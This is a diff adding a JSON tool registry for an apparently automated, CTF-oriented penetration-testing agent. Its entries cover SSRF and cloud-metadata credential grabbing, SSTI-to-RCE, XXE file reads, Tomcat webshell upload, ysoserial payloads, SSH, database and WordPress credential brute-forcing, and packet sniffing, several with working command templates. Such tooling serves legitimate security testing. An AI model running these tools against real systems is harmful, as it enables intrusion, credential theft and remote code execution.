+      "description": "Discover internal services through an SSRF vector. Given an SSRF endpoint URL, probes common internal hosts (localhost, 127.0.0.1, Docker bridge IPs 172.17-18.0.x, host.docker.internal, cloud metadata 169.254.169.254) and ports for accessible services. Uses GET by default, but can also try POST for services like IMDS that require it. IMPORTANT: do NOT restrict internal_hosts to 'localhost' alone — services often run on other containers reachable via Docker bridge IPs. Omit internal_hosts entirely to use the comprehensive defaults. When running inside containers, internal services are on Docker bridge IPs, NOT localhost. Automatically detects IMDS credentials (AccessKeyId/SecretAccessKey pattern) and extracts flags from responses.",
+      "domains": [],
+      "capability": "",
+      "parameters": {
+        "ssrf_url": {
+          "type": "string",
+          "description": "The SSRF-vulnerable endpoint URL (e.g. 'http://target:10110/fetch')"
+        },
+        "url_param": {
+          "type": "string",
+          "description": "URL parameter name for the SSRF query (default 'url')"
+        },
+        "port_param": {
+          "type": "string",
+          "description": "Optional port parameter name if separate from url_param"
+        },
+        "internal_hosts": {
+          "type": "string",
+          "description": "Comma-separated internal hosts to probe. LEAVE EMPTY to use defaults (covers localhost, Docker IPs 172.17-18.0.x, cloud metadata 169.254.169.254). Do NOT set to 'localhost' alone — this misses Docker-internal services."
+        },
+        "ports": {
+          "type": "string",
+          "description": "Comma-separated ports to probe (default: 80,443,8080,5000,3000)"
+        },
+        "paths": {
+          "type": "string",
+          "description": "Comma-separated paths to probe (default: /,/flag,/flag.txt,/admin,/api)"
+        },
+        "method": {
+          "type": "string",
+          "description": "HTTP method: GET or POST. Use POST for services like IMDS that require it (default: GET)"
+        }
+      },
+      "required": [
+        "ssrf_url",
+        "url_param",
+        "port_param",
+        "internal_hosts",
+        "ports",
+        "paths",
+        "method"
+      ],
+      "executor": "python",
+      "command_template": "",
+      "shell_args": [],
+      "split_params": [],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "ssti_inject",
+      "version": "1.0.0",
+      "description": "Test for Server-Side Template Injection (SSTI). Sends math evaluation payloads ({{7*7}}, ${7*7}, <%= 7*7 %>) to detect Jinja2/Twig/FreeMarker/ERB template injection. If SSTI is confirmed, attempts RCE via OS command execution to read flag files. Supports GET and POST methods.",
+      "domains": [],
+      "capability": "",
+      "parameters": {
+        "target_url": {
+          "type": "string",
+          "description": "Target URL or endpoint (e.g. 'http://target:10112/submit')"
+        },
+        "param_name": {
+          "type": "string",
+          "description": "Parameter name that is injected into the template (default 'name')"
+        },
+        "method": {
+          "type": "string",
+          "description": "HTTP method: GET (query string) or POST (form body). Default GET."
+        },
+        "template_engine": {
+          "type": "string",
+          "description": "Template engine to target: jinja2, twig, freemarker, erb, or 'all' to auto-detect. Default jinja2."
+        }
+      },
+      "required": [
+        "target_url",
+        "param_name",
+        "method",
+        "template_engine"
+      ],
+      "executor": "python",
+      "command_template": "",
+      "shell_args": [],
+      "split_params": [],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "tcpdump_capture",
+      "version": "1.0.0",
+      "description": "Capture network packets using tcpdump. Use for ARP spoofing detection (filter='arp'), DNS exfiltration analysis (filter='udp port 53'), credential sniffing (filter='tcp port 80 or tcp port 443'), and K8s network attacks. Common filters: 'arp', 'udp port 53', 'host 10.0.0.1', 'tcp port 80', 'icmp'. Use opts='-A' for ASCII payload, '-X' for hex+ASCII, '-c 100' for packet count limit.",
+      "domains": [],
+      "capability": "",
+      "parameters": {
+        "interface": {
+          "type": "string",
+          "description": "Network interface to capture on (e.g. 'eth0', 'any', 'docker0')",
+          "default": "eth0"
+        },
+        "filter": {
+          "type": "string",
+          "description": "BPF filter expression (e.g. 'udp port 53' for DNS, 'arp' for ARP, 'tcp port 80' for HTTP)",
+          "default": ""
+        },
+        "duration": {
+          "type": "integer",
+          "description": "Capture duration in seconds",
+          "default": 30
+        },
+        "opts": {
+          "type": "string",
+          "description": "Additional tcpdump options: '-A' for ASCII output, '-X' for hex+ASCII, '-c N' for packet count limit",
+          "default": "-A"
+        }
+      },
+      "required": [],
+      "executor": "shell",
+      "command_template": "timeout {duration} tcpdump -i {interface} -n {filter} {opts} 2>&1 | head -200",
+      "shell_args": [],
+      "split_params": [],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "test_credential",
+      "version": "1.0.0",
+      "description": "Test SSH credentials ONLY (uses sshpass). Does NOT work for MSSQL, MySQL, HTTP, or other protocols. For database credential testing use mssqlclient_query, mysql_query, psql_query, or oracle_query instead.",
+      "domains": [],
+      "capability": "",
+      "parameters": {
+        "user": {
+          "type": "string",
+          "description": "Username to test",
+          "default": "root"
+        },
+        "password": {
+          "type": "string",
+          "description": "Password to test",
+          "default": ""
+        },
+        "host": {
+          "type": "string",
+          "description": "Target host IP or hostname"
+        },
+        "port": {
+          "type": "integer",
+          "description": "SSH port (e.g. 10222)",
+          "default": 22
+        },
+        "command": {
+          "type": "string",
+          "description": "Command to execute if login succeeds (default: id)",
+          "default": "id"
+        }
+      },
+      "required": [
+        "host"
+      ],
+      "executor": "shell",
+      "command_template": "sshpass -p '{password}' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10 -p {port} {user}@{host} '{command}' 2>&1",
+      "shell_args": [],
+      "split_params": [],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "test_db_credential",
+      "version": "1.0.0",
+      "description": "Test credentials against a database service (MySQL, PostgreSQL, MSSQL, Oracle, Redis, MongoDB, Elasticsearch, CouchDB). Attempts a basic query to verify access. Use after discovering DB services via nmap. Credentials that succeed are confirmed valid.",
+      "domains": [],
+      "capability": "",
+      "parameters": {
+        "host": {
+          "type": "string",
+          "description": "Database host IP or hostname"
+        },
+        "port": {
+          "type": "integer",
+          "description": "Database port number"
+        },
+        "service_type": {
+          "type": "string",
+          "description": "Service type: mysql, postgresql, mssql, oracle, redis, mongodb, elasticsearch, couchdb"
+        },
+        "username": {
+          "type": "string",
+          "description": "Username (leave empty for Redis which is password-only)"
+        },
+        "password": {
+          "type": "string",
+          "description": "Password (leave empty for no-auth attempt)"
+        }
+      },
+      "required": [
+        "host",
+        "port",
+        "service_type",
+        "username",
+        "password"
+      ],
+      "executor": "python",
+      "command_template": "",
+      "shell_args": [],
+      "split_params": [],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "tomcat_exploit",
+      "version": "1.0.0",
+      "description": "Tomcat exploitation: upload a malicious file (WAR/JSP) to Tomcat manager or upload endpoint. Use for CVE-2025-24813 (deserialization upload) or deploying webshells. Provide payload as base64-encoded content. Combine with send_payload for advanced payload construction.",
+      "domains": [],
+      "capability": "",
+      "parameters": {
+        "target_url": {
+          "type": "string",
+          "description": "Tomcat upload URL (e.g. 'http://host:8080/manager/html/upload')"
+        },
+        "payload_b64": {
+          "type": "string",
+          "description": "Base64-encoded payload content (WAR file or JSP shell)"
+        },
+        "filename": {
+          "type": "string",
+          "description": "Filename for upload (e.g. 'shell.war', 'exploit.jsp')"
+        },
+        "http_method": {
+          "type": "string",
+          "description": "HTTP method: PUT for CVE-2024-50379 race condition, POST for standard uploads"
+        }
+      },
+      "required": [
+        "target_url",
+        "payload_b64",
+        "filename",
+        "http_method"
+      ],
+      "executor": "shell",
+      "command_template": "python3 -c \"import requests, base64\nb64 = '{payload_b64}'.encode()\ndata = base64.b64decode(b64)\nfiles = {{'file': ('{filename}', data)}}\ntry:\n    r = requests.{http_method}('{target_url}', files=files, timeout=30, verify=False)\n    print(f'Status: {{r.status_code}}')\n    print(r.text[:2000])\nexcept Exception as e:\n    print(f'Error: {{e}}')\n\" 2>&1",
+      "shell_args": [],
+      "split_params": [],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "try_login",
+      "version": "1.0.0",
+      "description": "Try to log in to a web app. Auto-detects forms, handles multi-step login, CSRF tokens. Returns session cookie on success.",
+      "domains": [],
+      "capability": "",
+      "parameters": {
+        "url": {
+          "type": "string",
+          "description": "Base URL of the web application"
+        },
+        "username": {
+          "type": "string",
+          "description": "Username to try"
+        },
+        "password": {
+          "type": "string",
+          "description": "Password to try"
+        }
+      },
+      "required": [
+        "url",
+        "username",
+        "password"
+      ],
+      "executor": "python",
+      "command_template": "",
+      "shell_args": [],
+      "split_params": [],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "whatweb_scan",
+      "version": "1.0.0",
+      "description": "Identify web technologies used by a target (lightweight, max 30s)",
+      "domains": [],
+      "capability": "",
+      "parameters": {
+        "target_url": {
+          "type": "string",
+          "description": "Target URL"
+        }
+      },
+      "required": [
+        "target_url"
+      ],
+      "executor": "shell",
+      "command_template": "timeout 30 whatweb --color=never -a 1 {target_url} 2>&1",
+      "shell_args": [],
+      "split_params": [],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "wp_xmlrpc_brute",
+      "version": "1.0.0",
+      "description": "Brute-force WordPress credentials via xmlrpc.php using wp.getUsers method. Use when you have identified a WordPress site and need to test weak credentials. Provide comma-separated username and password lists.",
+      "domains": [],
+      "capability": "",
+      "parameters": {
+        "target_url": {
+          "type": "string",
+          "description": "WordPress base URL (e.g. 'http://target/wordpress')"
+        },
+        "users": {
+          "type": "string",
+          "description": "Comma-separated usernames (e.g. 'admin,editor')"
+        },
+        "passwords": {
+          "type": "string",
+          "description": "Comma-separated passwords (e.g. 'password,admin,123456')"
+        }
+      },
+      "required": [
+        "target_url",
+        "users",
+        "passwords"
+      ],
+      "executor": "shell",
+      "command_template": "python3 -c \"\nimport requests, sys\nurl = '{target_url}/xmlrpc.php'\nusers = '{users}'.split(',')\npasswords = '{passwords}'.split(',')\nfor u in users:\n    for p in passwords:\n        xml = '''<?xml version=\\\\\\\"1.0\\\\\\\"?><methodCall><methodName>wp.getUsers</methodName><params><param><value><string>'''+u+'''</string></value></param><param><value><string>'''+p+'''</string></value></param></params></methodCall>'''\n        try:\n            r = requests.post(url, data=xml, timeout=10)\n            if r.status_code == 200 and 'faultCode' not in r.text:\n                print(f'SUCCESS: {{u}}:{{p}}')\n                print(r.text[:500])\n        except: pass\n\" 2>&1 | head -50",
+      "shell_args": [],
+      "split_params": [],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "wpscan_enum",
+      "version": "1.0.0",
+      "description": "WordPress vulnerability scanner using wpscan. Enumerate plugins, themes, users, and vulnerable components. Use when whatweb_scan identifies a WordPress installation. If no API token is available, vulnerability checking (vp/vt) degrades to plugin/theme listing (p/t) automatically.",
+      "domains": [],
+      "capability": "",
+      "parameters": {
+        "target_url": {
+          "type": "string",
+          "description": "WordPress base URL (e.g. 'http://target/wordpress')"
+        },
+        "enum_mode": {
+          "type": "string",
+          "description": "Enumeration mode: 'vp' (vulnerable plugins), 'vt' (vulnerable themes), 'u' (users), 'p' (all plugins), 't' (all themes), or combined e.g. 'p,u'"
+        },
+        "api_token": {
+          "type": "string",
+          "description": "WPScan API token (leave empty if not available — plugin/theme/user listing still works)"
+        }
+      },
+      "required": [
+        "target_url",
+        "enum_mode",
+        "api_token"
+      ],
+      "executor": "python",
+      "command_template": "",
+      "shell_args": [],
+      "split_params": [],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "xss_reflection_test",
+      "version": "1.0.0",
+      "description": "Test for XSS by sending GET/POST payloads and checking reflection",
+      "domains": [],
+      "capability": "",
+      "parameters": {
+        "url": {
+          "type": "string",
+          "description": "Target URL"
+        },
+        "param": {
+          "type": "string",
+          "description": "Parameter to test for XSS"
+        },
+        "method": {
+          "type": "string",
+          "description": "HTTP method (GET or POST, default GET)"
+        },
+        "insecure": {
+          "type": "boolean",
+          "description": "Skip TLS verification for self-signed certs"
+        }
+      },
+      "required": [
+        "url",
+        "param",
+        "method",
+        "insecure"
+      ],
+      "executor": "python",
+      "command_template": "",
+      "shell_args": [],
+      "split_params": [],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "xxe_inject",
+      "version": "1.0.0",
+      "description": "Send XXE (XML External Entity) payloads to read files or perform SSRF. Constructs external entity definitions targeting file:// paths. Supports inline DTD file read and external DTD mode for blind XXE. Also probes SSRF via XXE to cloud metadata endpoint (169.254.169.254). Sends requests with Content-Type: application/xml.",
+      "domains": [],
+      "capability": "",
+      "parameters": {
+        "target_url": {
+          "type": "string",
+          "description": "Target URL that accepts XML input (e.g. 'http://target:10113/import')"
+        },
+        "read_file": {
+          "type": "string",
+          "description": "File path to read via XXE (default '/flag.txt'). Try '/flag.txt', '/FLAG.txt', '/etc/passwd', 'C:\\\\flag.txt'."
+        },
+        "custom_xml": {
+          "type": "string",
+          "description": "Custom XML body with XXE payload (optional — if empty, auto-generates standard payloads)"
+        },
+        "use_dtd": {
+          "type": "boolean",
+          "description": "Enable blind XXE with parameter entity + external DTD (requires out-of-band server)"
+        }
+      },
+      "required": [
+        "target_url",
+        "read_file",
+        "custom_xml",
+        "use_dtd"
+      ],
+      "executor": "python",
+      "command_template": "",
+      "shell_args": [],
+      "split_params": [],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "ysoserial_generate",
+      "version": "1.0.0",
+      "description": "Generate Java deserialization payload using ysoserial. AUTO mode tries CommonsCollections6→Beanutils1→Groovy→Jdk7u21→Spring1 in order. Returns the first valid payload with delivery guidance (Tomcat session PUT, raw body, etc.). For Java deserialization vulnerabilities: WEB-01 (Tomcat CVE-2025-24813), RMI, JMX, JNDI injection.",
+      "domains": [],
+      "capability": "",
+      "parameters": {
+        "command": {
+          "type": "string",
+          "description": "Command to execute on target (default: 'cat /flag.txt')"
+        },
+        "gadget": {
+          "type": "string",
+          "description": "Gadget chain name, or 'auto' for sequential trial (default: auto)"
+        },
+        "target_url": {
+          "type": "string",
+          "description": "Optional target URL for delivery guidance"
+        }
+      },
+      "required": [
+        "command",
+        "gadget",
+        "target_url"
+      ],
+      "executor": "python",
+      "command_template": "",
+      "shell_args": [],
+      "split_params": [],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    }
+  ]
+}
